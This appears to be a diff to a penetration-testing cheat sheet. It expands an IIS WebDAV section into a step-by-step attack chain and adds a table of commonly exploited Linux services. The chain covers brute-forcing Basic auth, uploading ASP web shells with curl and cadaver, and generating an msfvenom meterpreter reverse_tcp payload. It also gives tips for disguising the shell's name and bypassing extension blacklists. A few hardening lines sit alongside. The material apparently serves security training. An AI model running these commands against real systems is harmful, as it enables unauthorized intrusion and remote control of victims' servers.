@@ -33,18 +33,32 @@ Defaults: Win10/11 client = SMB on, RDP/WinRM off; Server = SMB+RDP on, WinRM of
 ---
 # Windows Exploitation
 
-## IIS WebDAV
+## IIS WebDAV (full chain: enum → brute → upload → RCE)
 ```bash
-davtest -url <URL>
-davtest -auth <USER>:<PW> -url http://<TARGET_IP>/webdav
-cadaver <URL>
-nmap -p 80 --script http-enum -sV <TARGET_IP>
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f asp > shell.asp
+# 1. detect WebDAV + allowed methods
+nmap -p 80 --script http-enum,http-webdav-scan -sV <TARGET_IP>
+curl -X OPTIONS http://<TARGET_IP>/ -I        # look for PUT/DELETE/COPY/MOVE/PROPFIND + "401 WWW-Authenticate: Basic realm=WebDAV"
+curl -I http://<TARGET_IP>/webdav/
+# 2. brute the Basic auth
+curl -u admin:admin http://<TARGET_IP>/webdav/     # try defaults first
 hydra -L common_users.txt -P common_passwords.txt <TARGET_IP> http-get /webdav/
-# metasploit
+# 3. analyse what can be uploaded + executed
+davtest -auth <USER>:<PW> -url http://<TARGET_IP>/webdav/      # shows which extensions EXECUTE
+# 4. manual method tests
+curl -X PUT -u <USER>:<PW> http://<TARGET_IP>/webdav/test.txt -d "x"
+curl -X PROPFIND -u <USER>:<PW> http://<TARGET_IP>/webdav/     # dir listing
+# 5. web shell upload (Kali web shells in /usr/share/webshells/asp/)
+cadaver http://<TARGET_IP>/webdav/            # auth → put /usr/share/webshells/asp/cmdasp.asp ; ls ; quit
+curl -X PUT -u <USER>:<PW> http://<TARGET_IP>/webdav/shell.asp --data-binary @/usr/share/webshells/asp/cmdasp.asp
+# browse http://<TARGET_IP>/webdav/cmdasp.asp → run whoami/systeminfo/net user
+# 6. upgrade to meterpreter
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LOCAL_HOST_IP> LPORT=<LOCAL_PORT> -f asp > shell.asp
+# cadaver put shell.asp (rename to document_update.asp to blend in) ; start handler ; browse to trigger
+# metasploit (automated)
 use exploit/windows/iis/iis_webdav_upload_asp     # set HttpUsername/HttpPassword/PATH /webdav/metasploit.asp
 use exploit/multi/handler                           # payload windows/meterpreter/reverse_tcp
 ```
+Blacklist bypass: rename to `.asa` / `.cer` if `.asp` blocked. Cleanup: `curl -X DELETE -u <USER>:<PW> .../shell.asp` (or cadaver `delete`). Hardening: `Uninstall-WindowsFeature Web-DAV-Publishing`, strong auth, upload filtering.
 
 ## SMB
 ```bash
@@ -134,6 +148,23 @@ crackmapexec smb <TARGET_IP> -u Administrator -H "<NTLM_HASH>" -x "whoami"
 
 ---
 # Linux Exploitation
+
+## Frequently exploited Linux services (detect & attack surface)
+Linux = kernel (Torvalds) + GNU tools; distros: Kali, Ubuntu, Debian, CentOS/RHEL, Arch.
+| Service | Port | Detect / enumerate | Common vulns |
+|---|---|---|---|
+| **Apache HTTP** | 80/443 | `nmap -sV -p80,443` · `nmap -p80 --script http-enum,http-vuln*` | Shellshock (CVE-2014-6271), mod_ssl overflow, traversal, SSRF → web shell |
+| **SSH** | 22 | `nmap -p22 --script ssh-auth-methods,ssh2-enum-algos` | weak creds, key exposure, config weakness |
+| **FTP** | 21 | `nmap -p21 --script ftp-anon,ftp-bounce` · `ftp <TARGET_IP>` | anon write, weak creds, bounce, cleartext |
+| **Samba** | 139/445 | `smbclient -L //<TARGET_IP>/ -N` · `nmap -p445 --script smb-os-discovery,smb-vuln*` | SambaCry (CVE-2017-7494), weak shares, info disclosure |
+| **MySQL/MariaDB** | 3306 | `mysql -h <TARGET_IP> -u root -p` · `hydra ... mysql://<TARGET_IP>` | default/weak root, excessive privs |
+| **NFS** | 2049 | `showmount -e <TARGET_IP>` | world r/w exports, no_root_squash |
+| **RPC** | 111 | `rpcinfo -p <TARGET_IP>` | IPC used by NFS etc. |
+```bash
+nmap -sS -sV -p 21,22,80,443,445,3306,2049,111 <TARGET_IP>   # Linux service sweep
+nmap --script vuln <TARGET_IP>
+```
+Common chains: Apache vuln → web shell → reverse shell → privesc · weak SSH creds → access → lateral → exfil · Samba RCE → root. Hardening (report): SSH `PermitRootLogin no` + key-only + non-default port; Apache `ServerTokens Prod`/`ServerSignature Off`/`Options -Indexes`; Samba `server min protocol = SMB2`.
 
 ## Shellshock (Apache mod_cgi)
 ```bash
